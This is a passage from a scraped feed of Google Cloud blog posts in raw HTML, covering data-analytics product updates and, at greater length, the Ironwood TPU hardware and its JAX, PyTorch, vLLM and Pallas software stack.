href=\"https://airflow.apache.org/blog/airflow-three-point-oh-is-here/\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Airflow 3</strong></a><strong style=\"vertical-align: baseline;\"> arrives on </strong><a href=\"https://cloud.google.com/composer/docs/composer-3/composer-overview\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud Composer</strong></a><span style=\"vertical-align: baseline;\">: Google is the first hyperscaler to provide selected customers with access to Apache Airflow 3, integrated into our fully managed Cloud Composer 3 service. This is a significant step forward, allowing data teams to explore the next generation of workflow orchestration within a robust Google Cloud environment. Airflow 3 introduces powerful capabilities, including DAG versioning for enhanced auditability, scheduler-managed backfills for simpler historical data reprocessing, a modern React-based UI for more efficient operations, and many more features.</span></li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">June 2 - June 6</strong></h3>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Enhancing BigQuery workload management: </strong><a href=\"https://cloud.google.com/bigquery/docs/reservations-workload-management\"><span style=\"text-decoration: underline; vertical-align: baseline;\">BigQuery workload management</span></a><span style=\"vertical-align: baseline;\"> provides comprehensive control mechanisms to optimize workloads and resource allocation, preventing performance issues and resource contention, especially in high-volume environments. To make it even more useful, we announced several updates to BigQuery workload management around reservation fairness, predictability, flexibility and “securability,” new reservation labels, as well as autoscaler improvements. Get all the details </span><a href=\"https://cloud.google.com/blog/products/data-analytics/understanding-updates-to-bigquery-workload-management\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a><span style=\"vertical-align: baseline;\">. </span></li>\n<li><strong style=\"vertical-align: baseline;\">Bigtable Spark connector is now GA:</strong><span style=\"vertical-align: baseline;\"> The latest version of the </span><a href=\"https://cloud.google.com/bigtable/docs/release-notes#May_29_2025\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Bigtable Spark connector</span></a><span style=\"vertical-align: baseline;\"> opens up a world of possibilities for Bigtable and Apache Spark applications, not least of which is additional support for Bigtable and </span><a href=\"https://iceberg.apache.org/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Apache Iceberg</span></a><span style=\"vertical-align: baseline;\">, the open table format for large analytical datasets. Learn how to use the Bigtable Spark connector to interact with data stored in Bigtable from Apache Spark, and delve into powerful use cases that leverage Apache Iceberg </span><a href=\"https://cloud.google.com/blog/products/databases/bigtable-spark-connector-now-ga\"><span style=\"text-decoration: underline; vertical-align: baseline;\">in this post</span></a><span style=\"vertical-align: baseline;\">.</span></li>\n<li><strong style=\"vertical-align: baseline;\">BigQuery gets transactional:</strong><span style=\"vertical-align: baseline;\"> Over the years, we’ve added several capabilities to BigQuery to bring near-real-time, transactional-style operations directly into your data warehouse, so you can handle common data management tasks more efficiently from within the BigQuery ecosystem. In </span><a href=\"https://cloud.google.com/blog/products/data-analytics/bigquery-features-for-transactional-data-management\"><span style=\"text-decoration: underline; vertical-align: baseline;\">this blog post</span></a><span style=\"vertical-align: baseline;\">, you can learn about three of them: efficient fine-grained DML mutations; change history support for updates and deletes; and real-time updates with DML over streaming data.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Google Cloud databases integrate with MCP:</strong><span style=\"vertical-align: baseline;\"> We announced capabilities in </span><a href=\"https://cloud.google.com/blog/products/ai-machine-learning/mcp-toolbox-for-databases-now-supports-model-context-protocol\"><span style=\"text-decoration: underline; vertical-align: baseline;\">MCP Toolbox for Databases (Toolbox)</span></a><span style=\"vertical-align: baseline;\"> to make it easier to connect databases to AI assistants in your IDE. MCP Toolbox supports BigQuery, AlloyDB (including AlloyDB Omni), Cloud SQL for MySQL, Cloud SQL for PostgreSQL, Cloud SQL for SQL Server, Spanner, self-managed open-source databases including PostgreSQL, MySQL and SQLLite, as well as databases from other growing list of vendors including Neo4j, Dgraph, and more. Get all the details </span><a href=\"https://cloud.google.com/blog/products/ai-machine-learning/new-mcp-integrations-to-google-cloud-databases\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a><span style=\"vertical-align: baseline;\">. </span></li>\n</ul></div>",
        "published_date": "2025-11-06 16:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/compute/inside-the-ironwood-tpu-codesigned-ai-stack/",
        "title": "From silicon to softmax: Inside the Ironwood AI stack",
        "thumbnail": null,
        "author": "Manoj Krishnan",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">As machine learning models continue to scale, a specialized, co-designed hardware and software stack is no longer optional, it’s critical. </span><a href=\"https://cloud.google.com/blog/products/compute/ironwood-tpus-and-new-axion-based-vms-for-your-ai-workloads\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Ironwood</span></a><span style=\"vertical-align: baseline;\">, our latest generation Tensor Processing Unit (TPU), is the cutting-edge hardware behind advanced models like Gemini and Nano Banana, from massive-scale training to high-throughput, low-latency inference. This blog details the core components of Google's AI software stack that are woven into Ironwood, demonstrating how this deep co-design unlocks performance, efficiency, and scale. We cover the JAX and PyTorch ecosystems, the XLA compiler, and the high-level frameworks that make this power accessible.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">1. The co-designed foundation</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Foundation models today have trillions of parameters that require computation at ultra-large scale. We designed the Ironwood stack from the silicon up to meet this challenge.</span></p>\n<p><span style=\"vertical-align: baseline;\">The core philosophy behind the Ironwood stack is system-level co-design, treating the entire TPU pod not as a collection of discrete accelerators, but as a single, cohesive supercomputer. This architecture is built on a custom interconnect that enables massive-scale Remote Direct Memory Access (RDMA), allowing thousands of chips to exchange data directly at high bandwidth and low latency, bypassing the host CPU. Ironwood has a total of 1.77 PB of directly accessible HBM capacity, where each chip has eight stacks of HBM3E, with a peak HBM bandwidth of 7.4 TB/s and capacity of 192 GiB.  </span></p>\n<p><span style=\"vertical-align: baseline;\">Unlike general-purpose parallel processors,TPUs are Application-Specific Integrated Circuits (ASICs) built for one purpose: accelerating large-scale AI workloads. The deep integration of compute, memory, and networking is the foundation of their performance. At a high level, the TPU consists of two parts:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Hardware core</strong><span style=\"vertical-align: baseline;\">: The TPU core is centered around a dense</span><strong style=\"vertical-align: baseline;\"> Matrix Multiply Unit (MXU)</strong><span style=\"vertical-align: baseline;\"> for matrix operations, complemented by a powerful </span><strong style=\"vertical-align: baseline;\">Vector Processing Unit (VPU)</strong><span style=\"vertical-align: baseline;\"> for element-wise operations (activations, normalizations) and </span><strong style=\"vertical-align: baseline;\">SparseCores</strong><span style=\"vertical-align: baseline;\"> for scalable embedding lookups. This specialized hardware design is what delivers Ironwood's 42.5 Exaflops of FP8 compute.</span></p>\n</li>\n</ul>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Software target</strong><span style=\"vertical-align: baseline;\">: This hardware design is explicitly targeted by the </span><strong style=\"vertical-align: baseline;\">Accelerated Linear Algebra (XLA) compiler</strong><span style=\"vertical-align: baseline;\">, using a software co-design philosophy that </span><strong style=\"vertical-align: baseline;\">combines the broad benefits of whole-program optimization with the precision of hand-crafted custom kernels. </strong><span style=\"vertical-align: baseline;\">XLA's compiler-centric approach provides a powerful performance baseline by fusing operations into optimized kernels that saturate the MXU and VPU. This approach delivers good \"out of the box\" performance with broad framework and model support. This general-purpose optimization is then complemented by custom kernels </span><strong style=\"vertical-align: baseline;\">(detailed below in the Pallas section)</strong><span style=\"vertical-align: baseline;\"> to achieve peak performance on specific model-hardware combinations. This dual-pronged strategy is a fundamental tenet of the co-design.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">The figure below shows the layout of the Ironwood chip:</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/1_Z5xATZ3.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">This specialized design extends to the connectivity between TPU chips for massive scale-up and scale-out for a total of 88473.6 Tbps (11059.2TB/s) for a complete Ironwood superpod. </span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">The building block: Cubes and ICI.</strong><span style=\"vertical-align: baseline;\"> Each physical Ironwood host has four TPU chips. A single rack of these hosts has 64 Ironwood chips and forms a “cube”. Within this cube, every chip is connected via multiple high-speed </span><strong style=\"vertical-align: baseline;\">Inter-Chip Interconnect (ICI)</strong><span style=\"vertical-align: baseline;\"> links that form a direct 3D Torus topology. This creates an extremely dense, all-to-all network fabric, enabling massive bandwidth and low latency for distributed operations within the cube.</span></p>\n</li>\n</ul>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Scaling with OCS: Pods and Superpods</strong><span style=\"vertical-align: baseline;\"> To scale beyond a single cube, multiple cubes are connected using an </span><strong style=\"vertical-align: baseline;\">Optical Circuit Switch (OCS) </strong><span style=\"vertical-align: baseline;\">network.</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">This is</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">a dynamic, reconfigurable optical network that connects entire cubes, allowing the system to scale from a small \"pod\" (e.g., a 256-chip Ironwood pod with four cubes) to a massive \"superpod\" (e.g., a 9,216-chip system with 144 cubes). This OCS-based topology is key to fault tolerance. If a cube or link fails, the OCS fabric manager instructs the OCS to optically bypass the unhealthy unit and establish new, complete optical circuits connecting only the healthy cubes, swapping in a designated spare. This dynamic reconfigurability allows for both resilient operation and the provisioning of efficient \"slices\" of any size. </span><strong style=\"vertical-align: baseline;\">For the largest-scale systems, into the hundreds of thousands of chips, multiple superpods can then be connected via a standard Data-Center Network (DCN).</strong></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Chips can be configured in different “slices” with different OCS topologies as shown below.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"2\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/2_VdZkL7j.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Each chip is connected to 6 other chips in the 3D torus and provides 3 distinct axes for parallelism. </span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"3\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/3_KvozMKZ.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Ironwood delivers this performance while focusing on power efficiency, allowing AI workloads to run more cost-effectively. Ironwood perf/watt is 2x relative to Trillium, our previous-generation TPU. Our advanced liquid cooling solutions and optimized chip design can reliably sustain up to twice the performance of standard air cooling even under continuous, heavy AI workloads. Ironwood is nearly 30x more power efficient than our first Cloud TPU from 2018 and is our most power-efficient chip to date. </span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"4\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/4_UxXCPJg.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">It’s the software stack's job to translate high-level code into optimized instructions that leverage the full power of the hardware. The stack supports two primary frameworks: the </span><strong style=\"vertical-align: baseline;\">JAX</strong><span style=\"vertical-align: baseline;\"> ecosystem, which offers maximum performance and flexibility, as well as </span><strong style=\"vertical-align: baseline;\">PyTorch</strong><span style=\"vertical-align: baseline;\"> on TPUs, which provides a native experience for the PyTorch community.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">2. Optimizing the entire AI lifecycle</strong></h3>\n<p><span style=\"vertical-align: baseline;\">We use the principle of a co-designed Ironwood hardware and software stack to deliver maximum performance and efficiency across every phase of model development, with specific hardware and software capabilities tuned for each stage.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Pre-training</strong><span style=\"vertical-align: baseline;\">: This phase demands sustained, massive-scale computation. A </span><strong style=\"vertical-align: baseline;\">full 9,216-chip Ironwood superpod</strong><span style=\"vertical-align: baseline;\"> leverages the OCS and ICI fabric to operate as a single, massive parallel processor, achieving maximum sustained FLOPS utilization through different data formats. Running a job of this magnitude also requires resilience, which is managed by high-level software frameworks like </span><a href=\"https://maxtext.readthedocs.io/en/latest/\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">MaxText</strong></a><span style=\"vertical-align: baseline;\">, detailed in Section 3.3, that handle fault tolerance and checkpointing transparently.</span></p>\n</li>\n</ul>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Post-training (Fine-tuning and alignment)</strong><span style=\"vertical-align: baseline;\">: This stage includes diverse, FLOPS-intensive tasks like supervised fine-tuning (SFT) and Reinforcement Learning (RL), all requiring rapid iteration. RL, in particular, introduces complex, heterogeneous compute patterns. This stage often requires two distinct types of jobs to run concurrently: </span><strong style=\"vertical-align: baseline;\">high-throughput, inference-like sampling</strong><span style=\"vertical-align: baseline;\"> to generate new data (often called 'actor rollouts'), and </span><strong style=\"vertical-align: baseline;\">compute-intensive, training-like 'learner' steps</strong><span style=\"vertical-align: baseline;\"> that perform the gradient-based updates. Ironwood’s high-throughput, low-latency network and flexible OCS-based slicing are ideal for this type of rapid experimentation, </span><strong style=\"vertical-align: baseline;\">efficiently managing the different hardware demands of both sampling and gradient-based updates</strong><span style=\"vertical-align: baseline;\">. In Section 3.3, we discuss how we provide optimized software on Ironwood — including reference implementations and libraries — to make these complex fine-tuning and alignment workflows easier to manage and execute efficiently.</span></p>\n</li>\n</ul>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Inference (serving)</strong><span style=\"vertical-align: baseline;\">: In production, models must deliver low-latency predictions with high throughput and cost-efficiency. Ironwood is specifically engineered for this, with its large on-chip memory and compute power optimized for both the large-batch \"prefill\" phase and the memory-bandwidth-intensive \"decode\" phase of large generative models. To make this power easily accessible, we’ve optimized state-of-the-art serving engines. At launch, we’ve enabled </span><a href=\"https://blog.vllm.ai/2025/10/16/vllm-tpu.html\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">vLLM</strong></a><span style=\"vertical-align: baseline;\">, detailed in Section 3.3, providing the community with a top-tier, open-source solution that maximizes inference throughput on Ironwood.</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">3. The software ecosystem for TPUs</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The TPU stack, and Ironwood’s stack in particular, is designed to be modular, allowing developers to operate at the level of abstraction they need. In this section, we focus on the compiler/runtime, framework, and AI stack libraries.</span></p>\n<p><strong style=\"vertical-align: baseline;\">3.1 The JAX path: Performance and composability</strong></p>\n<p><span style=\"vertical-align: baseline;\">JAX is a high-performance numerical computing system co-designed with the TPU architecture. It provides a familiar NumPy-like API backed by powerful function transformations:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><code><strong style=\"vertical-align: baseline;\">jit</strong></code><span style=\"vertical-align: baseline;\"> </span><strong style=\"vertical-align: baseline;\">(Just-in-Time compilation)</strong><span style=\"vertical-align: baseline;\">: Uses the XLA compiler to fuse operations into a single, optimized kernel for efficient TPU execution.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code><strong style=\"vertical-align: baseline;\">grad</strong></code><span style=\"vertical-align: baseline;\"> </span><strong style=\"vertical-align: baseline;\">(automatic differentiation)</strong><span style=\"vertical-align: baseline;\">: Automatically computes gradients of Python functions, the fundamental mechanism for model training.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code><strong style=\"vertical-align: baseline;\">shard_map</strong></code><span style=\"vertical-align: baseline;\"> </span><strong style=\"vertical-align: baseline;\">(parallelism)</strong><span style=\"vertical-align: baseline;\">: The primitive for expressing distributed computations, allowing explicit control over how functions and data are sharded across a mesh of TPU devices, directly mapping to the ICI/OCS topology.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">This compositional approach allows developers to write clean, Pythonic code that JAX and XLA transform into highly parallelized programs optimized for TPU hardware. JAX is what Google Deepmind and other Google teams use to build, train, and service their variety of models. </span></p>\n<p><span style=\"vertical-align: baseline;\">For most developers, these primitives are abstracted by high-level frameworks, like </span><a href=\"https://maxtext.readthedocs.io/en/latest/\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">MaxText</strong></a><span style=\"vertical-align: baseline;\">, built upon a foundation of composable, production-proven libraries:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://optax.readthedocs.io/en/latest/\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Optax</strong></a><span style=\"vertical-align: baseline;\">: A flexible gradient processing and optimization library (e.g., AdamW)</span></p>\n</li>\n</ul>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://orbax.readthedocs.io/en/latest/\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Orbax</strong></a><span style=\"vertical-align: baseline;\">: A library for asynchronous checkpointing of distributed arrays across large TPU slices</span></p>\n</li>\n</ul>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://qwix.readthedocs.io/en/latest/\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Qwix</strong></a><span style=\"vertical-align: baseline;\">: A JAX quantization library supporting Quantization Aware Training (QAT) and Post-Training Quantization (PTQ)</span></p>\n</li>\n</ul>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://metrax.readthedocs.io/en/latest/\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Metrax</strong></a><span style=\"vertical-align: baseline;\">: A library for collecting and processing evaluation metrics in a distributed setting</span></p>\n</li>\n</ul>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://github.com/google/tunix\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Tunix</strong></a><span style=\"vertical-align: baseline;\">: A high-level library for orchestrating post-training jobs</span></p>\n</li>\n</ul>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://github.com/AI-Hypercomputer/ml-goodput-measurement\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Goodput</strong></a><span style=\"vertical-align: baseline;\">: A library for measuring and monitoring real-time ML training efficiency, providing a detailed breakdown of badput (e.g., initialization, data loading, checkpointing)</span></p>\n</li>\n</ul>\n<p><strong style=\"vertical-align: baseline;\">3.2 The PyTorch path: A native eager experience</strong></p>\n<p><span style=\"vertical-align: baseline;\">To bring Ironwood's power to the PyTorch community, we are developing a new, native PyTorch experience complete with support for a “native eager mode”, which executes operations immediately as they are called. Our goal is to provide a more natural and developer-friendly way to access Ironwood's scale, minimizing the code changes and level of effort required to adapt models for TPUs. This approach is designed to make the transition from local experimentation to large-scale training more straightforward.</span></p>\n<p><span style=\"vertical-align: baseline;\">This new framework is built on three core principles to ensure a truly PyTorch-native environment:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Full eager mode:</strong><span style=\"vertical-align: baseline;\"> Enables the rapid prototyping, debugging, and research workflows that developers expect from PyTorch.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Standard distributed APIs:</strong><span style=\"vertical-align: baseline;\"> Leverages the familiar </span><span style=\"vertical-align: baseline;\">torch.distributed</span><span style=\"vertical-align: baseline;\"> API, built on </span><span style=\"vertical-align: baseline;\">DTensor</span><span style=\"vertical-align: baseline;\">, for scaling training workloads across TPU slices.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Idiomatic compilation:</strong><span style=\"vertical-align: baseline;\"> Uses </span><span style=\"vertical-align: baseline;\">torch.compile</span><span style=\"vertical-align: baseline;\"> as the single, unified path to JIT compilation, utilizing XLA as its backend to trace the graph and compile it into efficient TPU machine code.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">This ensures the transition from local experimentation to large-scale distributed training is a natural extension of the standard PyTorch workflow. </span></p>\n<p><strong style=\"vertical-align: baseline;\">3.3 Frameworks: MaxText, PyTorch on TPU, and vLLM</strong></p>\n<p><span style=\"vertical-align: baseline;\">While JAX and PyTorch provide the computational primitives, scaling to thousands of chips is a supercomputer management problem. High-level frameworks handle the complexities of resilience, fault tolerance, and infrastructure orchestration.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://maxtext.readthedocs.io/en/latest/\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">MaxText</strong></a><strong style=\"vertical-align: baseline;\"> (JAX)</strong><span style=\"vertical-align: baseline;\">: MaxText is an open-source, high-performance LLM pre-training and post-training solution written in pure Python and JAX. MaxText demonstrates optimized training on its library of popular OSS models like DeepSeek, Qwen, gpt-oss, Gemma, and more. Whether users are pre-training large Mixture-of-Experts (MoE) models from scratch, or leveraging the latest Reinforcement Learning (RL) techniques on an OSS model, MaxText provides tutorials and APIs to make things easy. For scalability and resiliency, MaxText leverages </span><a href=\"https://cloud.google.com/ai-hypercomputer/docs/workloads/pathways-on-cloud/pathways-intro\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Pathways</strong></a><span style=\"vertical-align: baseline;\">, which was originally developed by Google DeepMind and now provides TPU users with differentiated capabilities like elastic training and multi-host inference during RL. </span></p>\n</li>\n</ul>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">PyTorch on TPU</strong><span style=\"vertical-align: baseline;\">: We recently shared our proposal about our PyTorch native experience on TPUs at </span><a href=\"https://events.linuxfoundation.org/pytorch-conference/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Pytorch Conference 2025</span></a><span style=\"vertical-align: baseline;\">, including an early preview of training on TPU with minimal code changes. In addition to the framework itself, we are working with the community (</span><a href=\"http://goo.gle/torch-xla-rfc\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">RFC</span></a><span style=\"vertical-align: baseline;\">), investing in reproducible recipes, reference implementations, and migration tools to enable PyTorch users to use their favorite frameworks on TPUs. Expect further updates as this work matures.</span></p>\n</li>\n</ul>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">vLLM TPU (Serving): </strong><span style=\"vertical-align: baseline;\">vLLM TPU is now powered by </span><a href=\"https://github.com/vllm-project/tpu-inference\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">tpu-inference</span></a><span style=\"vertical-align: baseline;\">, an expressive and powerful new hardware plugin that unifies JAX and PyTorch under a single lowering path – meaning both frameworks are translated to optimized TPU code through one common, shared backend. This new unified backend is not only faster than the previous generation of vLLM TPU but also offers broader model coverage. This integration provides more flexibility to JAX and PyTorch users, running PyTorch models performantly with no code changes while also extending native JAX support, all while retaining the standard vLLM user experience and interface.</span></p>\n</li>\n</ul>\n<p><strong style=\"vertical-align: baseline;\">3.4 Extreme performance: Custom kernels via Pallas</strong></p>\n<p><span style=\"vertical-align: baseline;\">While XLA is powerful, cutting-edge research often requires novel algorithms e.g. new attention mechanisms, custom padding to handle dynamic ragged tensors and other optimizations for custom MoE models that the XLA compiler cannot yet optimize.</span></p>\n<p><span style=\"vertical-align: baseline;\">The JAX ecosystem solves this with </span><strong style=\"vertical-align: baseline;\">Pallas</strong><span style=\"vertical-align: baseline;\">, a JAX-native kernel programming language embedded directly in Python. Pallas presents a unified, Python-first experience, dramatically reducing cognitive load and accelerating the iteration cycle. Other platforms lack this unified, in-Python approach, forcing developers to fragment their workflow. To optimize these operations, they must drop into a disparate ecosystem of lower-level tools—from DSLs like Triton and cuTE to raw CUDA C++ and PTX. This introduces significant mental overhead by forcing developers to manually manage memory, streams, and kernel launches, pulling them out of their Python-based environment</span></p>\n<p><span style=\"vertical-align: baseline;\">This is a clear example of co-design. Developers use Pallas to explicitly manage the accelerator's memory hierarchy, defining how \"tiles\" of data are staged from HBM into the extremely fast on-chip SRAM to be operated on by the MXUs. Pallas has two main parts to it. </span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Pallas:</strong><span style=\"vertical-align: baseline;\"> The developer defines the high-level algorithmic structure and memory logistics in Python.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Mosaic:</strong><span style=\"vertical-align: baseline;\"> This compiler backend translates the Pallas definition into optimized TPU machine code. It handles operator fusion, determines optimal tiling strategies, and generates software pipelines to perfectly overlap data transfers (HBM-to-SRAM) with computation (on the MXUs), with the sole objective of saturating the compute units.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Because Pallas kernels are JAX-traceable, they are fully compatible with </span><code style=\"vertical-align: baseline;\">jit</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">vmap</code><span style=\"vertical-align: baseline;\">, and </span><code style=\"vertical-align: baseline;\">grad</code><span style=\"vertical-align: baseline;\">. This stack provides Python-native extensibility for both JAX and PyTorch, as PyTorch users can consume Pallas-optimized kernels without ever leaving the native PyTorch API. Pallas kernels for PyTorch and JAX models, on both TPU and GPU, are available via </span><a href=\"https://github.com/openxla/tokamax\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Tokamax</strong></a><span style=\"vertical-align: baseline;\">, the ML ecosystem’s first multi-framework, multi-hardware kernel library.</span></p>\n<p><strong style=\"vertical-align: baseline;\">3.5 Performance engineering: Observability and debugging</strong></p>\n<p><span style=\"vertical-align: baseline;\">The Ironwood stack includes a full suite of tools for performance analysis, bottleneck detection, and debugging, allowing developers to fully optimize their workloads and operate large scale clusters reliably, </span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Cloud TPU metrics</strong><span style=\"vertical-align: baseline;\">: Exposes key system-level counters (FLOPS, HBM bandwidth, ICI traffic) to Google Cloud Monitoring that can then be exported to popular monitoring tools like Prometheus. </span></p>\n</li>\n</ul>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">TensorBoard</strong><span style=\"vertical-align: baseline;\">: Visualizes training metrics (loss, accuracy) and hosts the XProf profiler UI.</span></p>\n</li>\n</ul>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">XProf (OpenXLA Profiler)</strong><span style=\"vertical-align: baseline;\">: The essential toolset for deep performance analysis. It captures detailed execution data from both the host-CPU and all TPU devices, providing:</span></p>\n</li>\n</ul>\n<ul>\n<li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Trace Viewer</strong><span style=\"vertical-align: baseline;\">: A microsecond-level timeline of all operations, showing execution, collectives, and \"bubbles\" (idle time).</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Input Pipeline Analyzer</strong><span style=\"vertical-align: baseline;\">: Diagnoses host-bound vs. compute-bound bottlenecks.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Op Profile:</strong><span style=\"vertical-align: baseline;\"> Ranks all XLA/HLO operations by execution time to identify expensive kernels.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Memory Profiler</strong><span style=\"vertical-align: baseline;\">: Visualizes HBM usage over time to debug peak memory and fragmentation.</span></p>\n</li>\n</ul>\n</li>\n</ul>\n<p><strong style=\"vertical-align: baseline;\">Debugging Tools:</strong></p>\n<ul>\n<li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong 